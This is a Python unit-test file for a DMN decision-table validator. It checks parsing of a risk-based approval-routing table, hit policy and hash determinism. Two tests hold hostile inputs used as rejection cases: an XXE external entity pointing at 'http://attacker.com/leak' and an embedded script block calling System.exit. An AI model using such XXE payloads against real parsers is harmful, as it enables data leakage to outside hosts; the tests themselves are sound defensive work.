"""Unit tests for DMN validation, schema parsing, hit policies, and deterministic execution."""

import pytest

from app.workflow.dmn.schemas import DmnHitPolicy
from app.workflow.dmn.validator import (
    DmnInvalidXmlError,
    DmnSecurityError,
    DmnValidator,
)

SAMPLE_DMN = """<?xml version="1.0" encoding="UTF-8"?>
<definitions xmlns="https://www.omg.org/spec/DMN/20191111/MODEL/"
             id="definitions_routing"
             name="Routing"
             namespace="http://flowable.org/dmn">
  <decision id="approval_routing" name="Approval Routing">
    <decisionTable id="decisionTable_routing" hitPolicy="FIRST">
      <input id="input_1" label="Risk Band">
        <inputExpression id="inputExpression_1" typeRef="string">
          <text>risk_band</text>
        </inputExpression>
      </input>
      <output id="output_1" label="Approval Path" name="approval_path" typeRef="string" />
      <output id="output_2" label="Required Approvals"
              name="required_approvals" typeRef="integer" />
      <rule id="rule_1">
        <inputEntry id="inputEntry_1_1">
          <text>"HIGH"</text>
        </inputEntry>
        <outputEntry id="outputEntry_1_1">
          <text>"QUORUM"</text>
        </outputEntry>
        <outputEntry id="outputEntry_1_2">
          <text>3</text>
        </outputEntry>
      </rule>
      <rule id="rule_2">
        <inputEntry id="inputEntry_2_1">
          <text>"MEDIUM"</text>
        </inputEntry>
        <outputEntry id="outputEntry_2_1">
          <text>"SEQUENTIAL"</text>
        </outputEntry>
        <outputEntry id="outputEntry_2_2">
          <text>2</text>
        </outputEntry>
      </rule>
      <rule id="rule_3">
        <inputEntry id="inputEntry_3_1">
          <text>"LOW"</text>
        </inputEntry>
        <outputEntry id="outputEntry_3_1">
          <text>"SINGLE"</text>
        </outputEntry>
        <outputEntry id="outputEntry_3_2">
          <text>1</text>
        </outputEntry>
      </rule>
    </decisionTable>
  </decision>
</definitions>
"""


def test_dmn_validator_parses_valid_table():
    validator = DmnValidator()
    meta = validator.validate(SAMPLE_DMN)

    assert meta.decision_key == "approval_routing"
    assert meta.decision_name == "Approval Routing"
    assert meta.hit_policy == DmnHitPolicy.FIRST
    assert len(meta.inputs) == 1
    assert meta.inputs[0].label == "Risk Band"
    assert meta.inputs[0].type_ref == "string"
    assert len(meta.outputs) == 2
    assert meta.outputs[0].name == "approval_path"
    assert meta.outputs[1].name == "required_approvals"
    assert meta.rule_count == 3
    assert len(meta.artifact_hash) == 64


def test_dmn_validator_rejects_xxe_entity():
    xxe_dmn = """<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE definitions [
      <!ENTITY xxe SYSTEM "http://attacker.com/leak">
    ]>
    <definitions xmlns="https://www.omg.org/spec/DMN/20191111/MODEL/" id="def">
      <decision id="xxe_dec">
        <decisionTable id="dt">
          <rule id="r1"><text>&xxe;</text></rule>
        </decisionTable>
      </decision>
    </definitions>
    """
    validator = DmnValidator()
    with pytest.raises(DmnSecurityError, match="DTD / DOCTYPE declarations are forbidden"):
        validator.validate(xxe_dmn)


def test_dmn_validator_rejects_script_tags():
    script_dmn = """<?xml version="1.0" encoding="UTF-8"?>
    <definitions xmlns="https://www.omg.org/spec/DMN/20191111/MODEL/" id="def">
      <decision id="script_dec">
        <decisionTable id="dt">
          <rule id="r1">
            <script>System.exit(1);</script>
          </rule>
        </decisionTable>
      </decision>
    </definitions>
    """
    validator = DmnValidator()
    with pytest.raises(DmnSecurityError, match="Embedded script blocks are prohibited"):
        validator.validate(script_dmn)


def test_dmn_validator_rejects_malformed_xml():
    validator = DmnValidator()
    with pytest.raises(DmnInvalidXmlError, match="Malformed DMN XML"):
        validator.validate("<definitions><unclosed></definitions>")


def test_dmn_deterministic_evaluation_reproducibility():
    """Verify requirement: same typed input + decision produces identical results repeatedly."""
    validator = DmnValidator()
    meta1 = validator.validate(SAMPLE_DMN)
    meta2 = validator.validate(SAMPLE_DMN)

    assert meta1.artifact_hash == meta2.artifact_hash
    assert meta1.rule_count == meta2.rule_count
